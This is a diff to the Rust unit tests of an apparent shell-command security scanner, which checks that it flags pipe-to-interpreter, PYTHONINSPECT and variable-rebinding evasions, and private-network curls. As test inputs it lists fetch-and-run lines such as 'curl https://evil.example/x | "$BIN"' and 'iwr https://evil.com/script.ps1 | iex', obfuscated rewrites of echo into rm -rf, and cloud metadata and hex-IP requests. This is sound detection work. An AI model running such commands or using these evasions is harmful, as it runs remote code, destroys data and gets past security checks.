+        // An `--expand-<option>` value may be built from `--variable`
+        // contents (`f@file` reads a file), so the upload analysis keeps it
+        // unknown, which leaves the transfer incomplete.
+        let curl_expanded = command == "curl" && name.starts_with(CURL_EXPAND_OPTION_PREFIX);
+        if !curl_expanded && fetch_option_value(command, token).is_some() {
             return Some(UploadOptionRole::Value {
                 kind: UploadOptionValueKind::Other,
                 attached,
@@ -11750,6 +12342,7 @@ mod tests {
 
     #[test]
     fn known_home_command_names_do_not_prove_argv_values() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for word in ["~/bin/bash", "~/.local/lib/python3.11", "[", "[["] {
             assert!(command_name_is_statically_bound(word, ShellType::Posix));
             assert!(
@@ -11835,13 +12428,89 @@ mod tests {
     }
 
     #[test]
-    fn issue_264_variable_command_explains_the_unresolved_boundary() {
+    fn issue_264_literal_variable_command_resolves_like_the_literal_command() {
         for input in [
             r#"BIN=/bin/echo; "$BIN" --help"#,
             r#"BIN=/bin/echo; printf '%s\n' '--- a ---'; "$BIN" --help"#,
+            "BIN=/bin/echo\n\"${BIN}\" --help",
+            r#"BIN='/bin/echo' && "$BIN" --help"#,
+            r#"PY=python3; [ -x /usr/bin/python3 ] && "$PY" -c 'print(1)'"#,
+            r#"BIN=/bin/echo; PY=python3; "$BIN" a; "$PY" --version | tail -1"#,
+            r#"BIN=/bin/echo; X=abc; echo "$X" "${X}" "$X-1" 'a(b)'; "$BIN" "$X""#,
+            r#"BIN=/bin/echo; printf '%s %c %5s%%\n' abc d e_f; printf '%d\n' 42; "$BIN" hi"#,
+        ] {
+            // The engine resolves the root input and runs the command rules on
+            // its literal view; the typed text alone keeps the gap.
+            let view = crate::extract::posix_variable_command_literal_view(input, ShellType::Posix)
+                .unwrap_or_else(|| panic!("{input} must resolve"));
+            let findings = check_default(&view, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::AnalysisIncomplete),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn issue_264_variable_command_explains_the_unresolved_boundary() {
+        for input in [
             r#"readonly BIN=/bin/sh; BIN=/bin/echo; "$BIN" -c 'rm -rf /'"#,
             r#"declare -n BIN=ACTUAL; BIN=/bin/echo; "$BIN" --help"#,
+            r#"BIN=/bin/echo; $BIN --help"#,
+            r#""$BIN" --help; BIN=/bin/echo"#,
+            // Arithmetic, zsh subscripts and zsh glob-substitution qualifiers can
+            // rebind the name through a computed spelling (`$A$B` -> `BIN`).
+            r#"A=BI; B=N; BIN=/bin/echo; : $[$A$B=9]; "$BIN" hello"#,
+            r#"A=BI; B=N; BIN=/bin/echo; : "$[$A$B=9]"; "$BIN" hello"#,
+            r#"A=BI; B=N; BIN=/bin/echo; X=abc; echo "$X[$A$B=9]"; "$BIN" hello"#,
+            r#"A=BI; B=N; BIN=/bin/echo; X=abc; echo "${X}[$A$B=9]"; "$BIN" hello"#,
+            r#"A=BI; B=N; BIN=/bin/echo; echo "$1[$A$B=9]" "$#X[1]"; "$BIN" hello"#,
+            r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo $~X; "$BIN" -rf ~"#,
+            r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; ls $~X; "$BIN" -rf ~"#,
+            r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo hi >$~X; "$BIN" -rf ~"#,
+            r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo $=X $^X; "$BIN" -rf ~"#,
+            // An unquoted expansion is glob-substituted under a live GLOB_SUBST.
+            r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo $X; "$BIN" -rf ~"#,
+            r#"BIN=/bin/echo; echo `printf x` $(printf y); "$BIN" -rf ~"#,
+            // zsh and ksh evaluate printf numeric-conversion arguments, and ksh
+            // also literal `test` integer operands, as arithmetic, so a
+            // quote-split name assigns `BIN`.
+            r#"BIN=/bin/echo; printf '%d\n' 'BI''N=9'; "$BIN" hello"#,
+            r#"BIN=/bin/echo; printf '%*s\n' 'BI''N=3' x; "$BIN" hello"#,
+            r#"BIN=/bin/echo; printf "%s %d" a 'BI''N=9'; "$BIN" hello"#,
+            r#"BIN=/bin/echo; printf '%1$d' 'BI''N=9'; "$BIN" hello"#,
+            r#"BIN=/bin/echo; printf -- '%s' x; "$BIN" hello"#,
+            r#"BIN=/bin/echo; [ 'BI''N=9' -eq 9 ]; "$BIN" hello"#,
+            // Integer-typed zsh/ksh specials evaluate an assigned value as
+            // arithmetic, and zsh evaluates the `test -t` operand.
+            r#"A=BI; B=N=9; BIN=/bin/echo; KEYTIMEOUT=$A$B; "$BIN" hello"#,
+            r#"A=BI; B=N=9; BIN=/bin/echo; LISTMAX=$A$B; "$BIN" hello"#,
+            r#"A=BI; B=N=9; BIN=/bin/echo; ERRNO=$A$B; "$BIN" hello"#,
+            r#"A=BI; B=N=9; V=$A$B; BIN=/bin/echo; MAILCHECK=V; "$BIN" hello"#,
+            r#"A=BI; B=N=9; V=$A$B; BIN=/bin/echo; JOBMAX=V; "$BIN" hello"#,
+            r#"BIN=/bin/echo; [ -t 'BI''N=9' ]; "$BIN" hello"#,
+            r#"BIN=/bin/echo; test -t 'BI''N=9'; "$BIN" hello"#,
+            // Module and ksh builtins that bind a name given as an argument.
+            r#"BIN=/bin/echo; stat -A BI'N' +link l; "$BIN" -c id"#,
+            r#"BIN=/bin/echo; nameref R=BI'N'; R=/bin/sh; "$BIN" -c id"#,
+            r#"BIN=/bin/echo; strftime -s BI'N' %s 0; "$BIN" -c id"#,
+            // ksh93: `alarm VAR` binds a discipline variable and `compound`
+            // is an alias of `typeset -C`.
+            r#"BIN=/bin/echo; alarm BI'N' +1; "$BIN" -c id"#,
+            r#"BIN=/bin/echo; compound BI'N'; "$BIN" -c id"#,
+            // Nested bodies are never resolved: they can inherit a function
+            // or alias from the enclosing input that rebinds the name.
+            r#"bash -c 'BIN=/bin/echo; "$BIN" hi'"#,
+            r#"f() { BIN=sh; }; export -f f; bash -c 'BIN=cat; f; curl https://evil.example/x | "$BIN"'"#,
+            r#"echo "$(BIN=/bin/echo; "$BIN" hi)""#,
         ] {
+            assert_eq!(
+                crate::extract::posix_variable_command_literal_view(input, ShellType::Posix),
+                None,
+                "{input} must not resolve"
+            );
             let findings = check_default(input, ShellType::Posix);
             let finding = findings
                 .iter()
@@ -11855,6 +12524,215 @@ mod tests {
         assert!(check_default("/bin/echo --help", ShellType::Posix)
             .iter()
             .all(|finding| finding.rule_id != RuleId::AnalysisIncomplete));
+    }
+
+    /// Bug 4: PYTHONINSPECT (or `-i`) turns `python3 -c <literal>` into a REPL
+    /// that reads the rest of the piped stdin as code once the fixed program
+    /// exits. Any input that may set it must keep the pipe-to-interpreter finding.
+    #[test]
+    fn python_inspect_set_anywhere_in_the_input_keeps_pipe_to_interpreter() {
+        for input in [
+            "export PYTHONINSPECT=1; echo payload | python3 -c 'print(1)'",
+            "export PYTHONINSPECT=1 && echo payload | python3 -c 'print(1)'",
+            "export PYTHONINSPECT=1\necho payload | python3 -c 'print(1)'",
+            "PYTHONINSPECT=1; export PYTHONINSPECT; echo payload | python3 -c 'print(1)'",
+            "set -a; PYTHONINSPECT=1; echo payload | python3 -c 'print(1)'",
+            "declare -x PYTHONINSPECT=1; echo payload | python3 -c 'print(1)'",
+            "typeset -x PYTHONINSPECT=1; echo payload | python3 -c 'print(1)'",
+            "export PYTHON\"INSPECT\"=1; echo payload | python3 -c 'print(1)'",
+            "export PYTHONINSP${E}CT=1; echo payload | python3 -c 'print(1)'",
+            "export $'PYTHON\\x49NSPECT=1'; echo payload | python3 -c 'print(1)'",
+            "builtin export PYTHON\"INSPECT\"=1; echo payload | python3 -c 'print(1)'",
+            "command export PYTHON\"INSPECT\"=1; echo payload | python3 -c 'print(1)'",
+            "{ export PYTHON\"INSPECT\"=1; }; echo payload | python3 -c 'print(1)'",
+            "if true; then export PYTHON\"INSPECT\"=1; fi; echo payload | python3 -c 'print(1)'",
+            "eval \"$SETUP\"; echo payload | python3 -c 'print(1)'",
+            ". ./env.sh; echo payload | python3 -c 'print(1)'",
+            "source ./env.sh; echo payload | python3 -c 'print(1)'",
+            "alias python3='python3 -i'\necho payload | python3 -c 'print(1)'",
+            "echo payload | env PYTHONINSPECT=1 python3 -c 'print(1)'",
+            "echo payload | PYTHONINSPECT=1 python3 -c 'print(1)'",
+            "echo payload | python3 -i -c 'print(1)'",
+        ] {
+            assert!(
+                fires_pipe_to_interpreter(input),
+                "PYTHONINSPECT/-i source was not refused: {input:?}"
+            );
+        }
+        // Unrelated environment changes keep the issue #136 data-pipeline exemption.
+        for input in [
+            "echo hi | python3 -c 'print(1)'",
+            "export FOO=bar; echo hi | python3 -c 'print(1)'",
+            "cd /tmp && printf '{}' | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
+        ] {
+            assert!(!fires_pipe_to_interpreter(input), "{input:?}");
+        }
+    }
+
+    /// Bug 4 follow-up: the PYTHONINSPECT decision covers the whole checked
+    /// command. A pipe inside a group, substitution, `sh -c` or `eval` body
+    /// inherits an export from the enclosing command. With allexport on
+    /// (`set -a`), an assignment whose variable name is not literal
+    /// (`printf -v "$N"`) may export PYTHONINSPECT too.
+    #[test]
+    fn python_inspect_reaches_nested_bodies_and_allexport_dynamic_assignments() {
+        for input in [
+            // Nested bodies inherit the enclosing command's environment.
+            "export PYTHONINSPECT=1; (echo hi | python3 -c 'print(1)')",
+            "export PYTHONINSPECT=1; { echo hi | python3 -c 'print(1)'; }",
+            "export PYTHONINSPECT=1; x=$(echo hi | python3 -c 'print(1)')",
+            "export PYTHONINSPECT=1; bash -c 'echo hi | python3 -c \"print(1)\"'",
+            "PYTHONINSPECT=1 bash -c 'echo hi | python3 -c \"print(1)\"'",
+            "env PYTHONINSPECT=1 sh -c 'echo hi | python3 -c \"print(1)\"'",
+            "export PYTHONINSPECT=1; eval \"echo hi | python3 -c 'print(1)'\"",
+            "export PYTHON\"INSPECT\"=1; (echo hi | python3 -c 'print(1)')",
+            "export PYTHONINSPECT=1; (bash -c 'echo hi | python3 -c \"print(1)\"')",
+            // allexport exports every assignment, including dynamically named ones.
+            "set -a; printf -v \"$(echo PYTHON)INSPECT\" 1; echo payload | python3 -c 'print(1)'",
+            "set -o allexport; printf -v \"$N\" 1; echo payload | python3 -c 'print(1)'",
+            "set -ea; let \"$N=1\"; echo payload | python3 -c 'print(1)'",
+            "setopt allexport; printf -v \"$N\" 1; echo payload | python3 -c 'print(1)'",
+            "setopt ALL_EXPORT; printf -v \"$N\" 1; echo payload | python3 -c 'print(1)'",
+            "shopt -so allexport; printf -v \"$N\" 1; echo payload | python3 -c 'print(1)'",
+            "set -$FLAGS; printf -v \"$N\" 1; echo payload | python3 -c 'print(1)'",
+            "set -a; printf -v PYTHONINSPEC? 1; echo payload | python3 -c 'print(1)'",
+            "set -a; (printf -v \"$N\" 1; echo payload | python3 -c 'print(1)')",
+            "set -a; bash -c 'printf -v \"$N\" 1; echo payload | python3 -c \"print(1)\"'",
+            // allexport may already be on in the interactive shell, so a
+            // builtin that assigns a non-literal variable name is refused too.
+            "set -e; printf -v \"$N\" 1; echo hi | python3 -c 'print(1)'",
+            "read -r \"$N\" <<< 1; echo hi | python3 -c 'print(1)'",
+            "wait -p \"$N\"; echo hi | python3 -c 'print(1)'",
+            "printf '-v' \"$N\" 1; echo hi | python3 -c 'print(1)'",
+        ] {
+            assert!(
+                fires_pipe_to_interpreter(input),
+                "PYTHONINSPECT source was not refused: {input:?}"
+            );
+        }
+        // Nested data pipelines and non-exporting dynamic assignments keep the
+        // issue #136 exemption.
+        for input in [
+            "(echo hi | python3 -c 'print(1)')",
+            "{ echo hi | python3 -c 'print(1)'; }",
+            "bash -c 'echo hi | python3 -c \"print(1)\"'",
+            "export FOO=bar; (echo hi | python3 -c 'print(1)')",
+            "set -a; FOO=bar; echo hi | python3 -c 'print(1)'",
+            "read -r line; echo hi | python3 -c 'print(1)'",
+            "printf '%s' \"$DATA\" | python3 -c 'import sys; print(sys.stdin.read())'",
+        ] {
+            assert!(!fires_pipe_to_interpreter(input), "{input:?}");
+        }
+    }
+
+    /// Bug 4 follow-up: `alias`, `source` and `.` also start a command after a
+    /// case pattern (`*)`) or a spaced function header (`f () {`), and a `trap`
+    /// action runs like `eval` (a DEBUG trap before every later command). Each
+    /// can make the later `python3 -c` run with `-i` or PYTHONINSPECT set.
+    #[test]
+    fn python_inspect_sources_after_case_patterns_function_headers_and_in_traps() {
+        for input in [
+            "case x in *) alias python3='python3 -i';; esac\necho hi | python3 -c 'print(1)'",
+            "case x in *) . ./env.sh;; esac; echo hi | python3 -c 'print(1)'",
+            "case x in *) source ./env.sh;; esac; echo hi | python3 -c 'print(1)'",
+            "case x in a|b) alias python3='python3 -i';; esac; echo hi | python3 -c 'print(1)'",
+            "f () { . ./env.sh; }; f; echo hi | python3 -c 'print(1)'",
+            "f() { source ./env.sh; }; f; echo hi | python3 -c 'print(1)'",
+            "trap 'alias python3=\"python3 -i\"' DEBUG; true\necho hi | python3 -c 'print(1)'",
+            "trap 'python3(){ command python3 -i \"$@\"; }' DEBUG; true; echo hi | python3 -c 'print(1)'",
+            "S=$(printf 'python3(){ command python3 -%s \"$@\"; }' i); trap \"$S\" DEBUG; true; echo hi | python3 -c 'print(1)'",
+            "trap -- '. ./env.sh' DEBUG; true; echo hi | python3 -c 'print(1)'",
+            "trap \"$ACTION\" DEBUG; echo hi | python3 -c 'print(1)'",
+        ] {
+            assert!(
+                fires_pipe_to_interpreter(input),
+                "PYTHONINSPECT/-i source was not refused: {input:?}"
+            );
+        }
+        // Plain case arms, function bodies and literal traps that change
+        // nothing about python keep the issue #136 exemption.
+        for input in [
+            "case x in *) echo hi;; esac; echo hi | python3 -c 'print(1)'",
+            "f () { echo hi; }; f; echo hi | python3 -c 'print(1)'",
+            "trap 'rm -f \"$tmp\"' EXIT; echo hi | python3 -c 'print(1)'",
+            "trap - DEBUG; echo hi | python3 -c 'print(1)'",
+        ] {
+            assert!(!fires_pipe_to_interpreter(input), "{input:?}");
+        }
+    }
+
+    /// The inherited PYTHONINSPECT decision is the caller's, passed in; the
+    /// rule never reads the analyzing process's environment (a daemon analyzes
+    /// for other shells).
+    #[test]
+    /// The PYTHONINSPECT guard refuses the issue #136 exemption only for
+    /// inputs that may actually set it: a literal NAME with a dynamic value,
+    /// `unset PYTHONINSPECT`, and the string inside an inert `python -c` body
+    /// keep the exemption, while dynamic names, namerefs, a prefix assignment
+    /// on `unset`, and an assignment of PYTHONINSPECT itself still refuse it.
+    fn python_inspect_guard_allows_literal_names_with_dynamic_values() {
+        for input in [
+            "export PATH=\"$HOME/bin:$PATH\"; cat data.json | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
+            "local x=\"$1\"; echo hi | python3 -c 'print(1)'",
+            "export FOO=\"$BAR\"; echo hi | python3 -c 'print(1)'",
+            "declare -x FOO+=\"$BAR\"; echo hi | python3 -c 'print(1)'",
+            "readonly V=$(date); echo hi | python3 -c 'print(1)'",
+            "unset PYTHONINSPECT; echo hi | python3 -c 'print(1)'",
+            "unset -v PYTHONINSPECT FOO; echo hi | python3 -c 'print(1)'",
+            "cat data.json | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d[\"PYTHONINSPECT\"])'",
+        ] {
+            assert!(!fires_pipe_to_interpreter(input), "{input:?}");
+        }
+        for input in [
+            "export \"$N\"=1; echo hi | python3 -c 'print(1)'",
+            "export \"$N=1\"; echo hi | python3 -c 'print(1)'",
+            "export ${N}=1; echo hi | python3 -c 'print(1)'",
+            "export $N; echo hi | python3 -c 'print(1)'",
+            "declare -n r=\"$V\"; r=1; export r; echo hi | python3 -c 'print(1)'",
+            "local -n r=\"$V\"; echo hi | python3 -c 'print(1)'",
+            "PYTHONINSPECT=1 unset X; echo hi | python3 -c 'print(1)'",
+            "unset \"$X\"; export PYTHONINSPECT=1; echo hi | python3 -c 'print(1)'",
+            "export PYTHONINSPECT=\"$V\"; echo hi | python3 -c 'print(1)'",
+            "echo hi | python3 -c 'import os; os.environ[\"PYTHONINSPECT\"]=\"1\"'",
+            "read -r \"$N\" <<< 1; echo hi | python3 -c 'print(1)'",
+        ] {
+            assert!(
+                fires_pipe_to_interpreter(input),
+                "PYTHONINSPECT source was not refused: {input:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn inherited_python_inspect_is_the_callers_decision() {
+        let input = "echo payload | python3 -c 'print(1)'";
+        let fires = |inherited: bool| {
+            check_with_inherited_python_inspect(
+                input,
+                ShellType::Posix,
+                None,
+                ScanContext::Exec,
+                inherited,
+            )
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::PipeToInterpreter)
+        };
+        assert!(
+            fires(true),
+            "an inherited PYTHONINSPECT refuses the exemption"
+        );
+        assert!(!fires(false), "#136 exemption applies without it");
+        // Nested bodies inherit the caller's decision too.
+        let nested = check_with_inherited_python_inspect(
+            "(echo payload | python3 -c 'print(1)')",
+            ShellType::Posix,
+            None,
+            ScanContext::Exec,
+            true,
+        );
+        assert!(nested
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::PipeToInterpreter));
     }
 
     #[test]
@@ -13234,6 +14112,7 @@ mod tests {
 
     #[test]
     fn ten_mib_lsp_shape_keeps_short_command_detection_and_bounds_the_long_tail() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let prefix = "curl https://example.test/install.sh | bash\n";
         let cap = crate::scan::MAX_FILE_SIZE as usize;
         let mut input = prefix.to_string();
@@ -13568,6 +14447,7 @@ mod tests {
 
     #[test]
     fn effective_command_preserves_execution_context_changes() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let resolve = |input: &str| {
             let segment = tokenize::tokenize(input, ShellType::Posix)
                 .into_iter()
@@ -14711,6 +15591,7 @@ mod tests {
 
     #[test]
     fn test_resolve_interpreter_name_unwraps_env_split_string() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Direct R9-3 coverage: `env -S "sudo bash -c id"` (and `--split-string=`)
         // resolves to `bash`; plain forms unchanged.
         let resolve = |input: &str| {
@@ -14740,6 +15621,7 @@ mod tests {
 
     #[test]
     fn test_resolve_interpreter_name_unwraps_nested_env_split_string() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // CodeRabbit M13 round-20 F2: `resolve_interpreter_name` unwraps the env -S
         // layer REPEATEDLY (bounded), so a nested payload
         // `env -S "env -S 'sudo bash -c id'"` is fully peeled before the leader walk.
@@ -14799,6 +15681,7 @@ mod tests {
 
     #[test]
     fn test_resolve_interpreter_name_peels_env_split_string_behind_wrapper() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // CodeRabbit M13 round-21 F2: the peel loop now unwraps generic wrappers
         // AND env-S in one bounded pass, so an env-S nested behind another wrapper
         // (`sudo env -S "…"`) is peeled and its inner interpreter exposed.
@@ -15244,10 +16127,17 @@ mod tests {
 
     #[test]
     fn fetch_destination_operand_roles_follow_client_option_grammars() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let strings = |values: &[&str]| {
             values
                 .iter()
                 .map(|value| (*value).to_string())
+                .collect::<Vec<_>>()
+        };
+        let url_fetch_destination_operands = |command: &str, args: &[String], shell| {
+            url_fetch_destination_operands(command, args, shell)
+                .into_iter()
+                .map(|destination| destination.text)
                 .collect::<Vec<_>>()
         };
 
@@ -15307,6 +16197,85 @@ mod tests {
                 ShellType::PowerShell,
             ),
             strings(&["https://proxy.example:8443", "allowed.example/path"]),
+        );
+
+        // curl 8.3+: `--expand-<option>` takes the value `<option>` takes,
+        // with `{{name}}` curl variables in it.
+        let expanded = strings(&[
+            "--variable",
+            "%TOKEN",
+            "--expand-header",
+            "Authorization: Bearer {{TOKEN}}",
+            "--expand-data",
+            "{\"id\":{{id}}}",
+            "--expand-url",
+            "https://{{HOST}}/health",
+            "--expand-resolve",
+            "allowed.example:443:{{ADDR}}",
+            "allowed.example/path",
+        ]);
+        assert_eq!(
+            url_fetch_destination_operands("curl", &expanded, ShellType::Posix),
+            strings(&[
+                "https://{{HOST}}/health",
+                "{{ADDR}}",
+                "allowed.example/path"
+            ]),
+        );
+        assert_eq!(
+            curl_url_operands(&expanded, ShellType::Posix)
+                .into_iter()
+                .map(|operand| (operand.text, operand.curl_variables))
+                .collect::<Vec<_>>(),
+            vec![
+                ("https://{{HOST}}/health".to_string(), true),
+                ("allowed.example/path".to_string(), false),
+            ],
+        );
+        // An unknown `--expand-` option keeps its value as an operand.
+        assert_eq!(
+            url_fetch_destination_operands(
+                "curl",
+                &strings(&["--expand-bogus", "x.example", "allowed.example/path"]),
+                ShellType::Posix,
+            ),
+            strings(&["x.example", "allowed.example/path"]),
+        );
+
+        // A redirection and its target belong to the shell.
+        assert_eq!(
+            url_fetch_destination_operands(
+                "curl",
+                &strings(&[
+                    "-s",
+                    "allowed.example/path",
+                    ">",
+                    "denied.example",
+                    "2>errors[1].log",
+                    "<",
+                    "in[x].txt",
+                    "&>out{a}.log",
+                ]),
+                ShellType::Posix,
+            ),
+            strings(&["allowed.example/path"]),
+        );
+        assert_eq!(
+            url_fetch_destination_operands(
+                "wget",
+                &strings(&["-q", "allowed.example/path", ">>", "denied.example"]),
+                ShellType::Posix,
+            ),
+            strings(&["allowed.example/path"]),
+        );
+        // A quoted operator is an operand.
+        assert_eq!(
+            url_fetch_destination_operands(
+                "curl",
+                &strings(&["'>'", "allowed.example/path"]),
+                ShellType::Posix,
+            ),
+            strings(&[">", "allowed.example/path"]),
         );
 
         for dash in ['\u{2013}', '\u{2014}', '\u{2015}'] {
@@ -15858,6 +16827,7 @@ mod tests {
 
     #[test]
     fn test_flag_value_url_metadata_endpoint() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let findings = check(
             "curl --url=http://169.254.169.254/latest/meta-data",
             ShellType::Posix,
@@ -15872,8 +16842,26 @@ mod tests {
         );
     }
 
+    /// Bug 5: an empty-hex curl host is a DNS name for curl 8.7.1 but a
+    /// numeric address for builds that resolve through libc `inet_aton`.
+    #[test]
+    fn curl_empty_hex_numeric_reading_is_checked_for_private_network() {
+        let findings = check_default("curl http://0xa.0x.0x.0x5/internal", ShellType::Posix);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::PrivateNetworkAccess),
+            "{findings:?}"
+        );
+        let loopback = check_default("curl http://0x7f.0x/internal", ShellType::Posix);
+        assert!(loopback
+            .iter()
+            .all(|f| f.rule_id != RuleId::PrivateNetworkAccess));
+    }
+
     #[test]
     fn test_flag_value_url_private_network() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let findings = check(
             "curl --url=http://10.0.0.1/internal",
             ShellType::Posix,
@@ -15895,6 +16883,7 @@ mod tests {
 
     #[test]
     fn test_vet_not_configured_fires_without_supply_chain() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let cwd = dir.path().to_str().unwrap();
         let findings = check(
@@ -15910,6 +16899,7 @@ mod tests {
 
     #[test]
     fn test_vet_not_configured_suppressed_with_supply_chain() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let sc_dir = dir.path().join("supply-chain");
         std::fs::create_dir_all(&sc_dir).unwrap();
@@ -15928,6 +16918,7 @@ mod tests {
 
     #[test]
     fn test_vet_not_configured_skips_non_install() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let cwd = dir.path().to_str().unwrap();
         let findings = check(
@@ -15943,6 +16934,7 @@ mod tests {
 
     #[test]
     fn test_vet_detects_cargo_with_flags() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let cwd = dir.path().to_str().unwrap();
         let f1 = check(
@@ -15970,6 +16962,7 @@ mod tests {
 
     #[test]
     fn test_vet_skipped_in_paste_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let cwd = dir.path().to_str().unwrap();
         let findings = check(
@@ -15985,6 +16978,7 @@ mod tests {
 
     #[test]
     fn test_vet_no_false_positive_on_non_install_subcommand() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let cwd = dir.path().to_str().unwrap();
         let f1 = check(
@@ -16005,6 +16999,7 @@ mod tests {
 
     #[test]
     fn test_vet_detects_cargo_exe_windows_path() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let cwd = dir.path().to_str().unwrap();
         let f1 = check(
@@ -16351,7 +17346,12 @@ mod tests {
         let input = "curl https://example.com/install.sh | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             findings[0].description.contains("getvet.sh"),
@@ -16369,7 +17369,12 @@ mod tests {
         let input = r#"curl "https://example.com/install.sh" | bash"#;
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             findings[0].evidence.iter().any(
@@ -16384,7 +17389,12 @@ mod tests {
         let input = "curl --url=https://example.com/install.sh | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             findings[0].evidence.iter().any(
@@ -16399,7 +17409,12 @@ mod tests {
         let input = "curl https://trusted.example.com/install.sh https://evil.example.com/payload.sh | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
 
         let urls: Vec<&str> = findings[0]
@@ -16425,7 +17440,12 @@ mod tests {
         let input = "cat /tmp/script.sh | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             !findings[0].description.contains("getvet.sh"),
@@ -16442,7 +17462,12 @@ mod tests {
         let input = "curl https://example.com/install.sh | command -- bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1, "should detect bash after --");
     }
 
@@ -16451,7 +17476,12 @@ mod tests {
         let input = "curl https://example.com/install.sh | sudo -- bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1, "should detect bash after sudo --");
         assert!(
             findings[0].description.contains("interpreter 'bash'"),
@@ -16485,7 +17515,12 @@ mod tests {
         let input = "curl https://example.com/install.sh | sudo -iu root bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(
             findings.len(),
             1,
@@ -16503,7 +17538,12 @@ mod tests {
         let input = "iwr https://evil.com/script.ps1 | iex";
         let segments = tokenize::tokenize(input, ShellType::PowerShell);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::PowerShell, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::PowerShell,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             findings[0].description.contains("getvet.sh"),
@@ -16520,7 +17560,12 @@ mod tests {
         let input = "curl https://example.com/\x1b[31mred | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             !findings[0].description.contains('\x1b'),
@@ -16539,7 +17584,12 @@ mod tests {
         let input = "curl \"https://example.com/\nFAKE: safe\" | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
-        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        check_pipe_to_interpreter(
+            &segments,
+            ShellType::Posix,
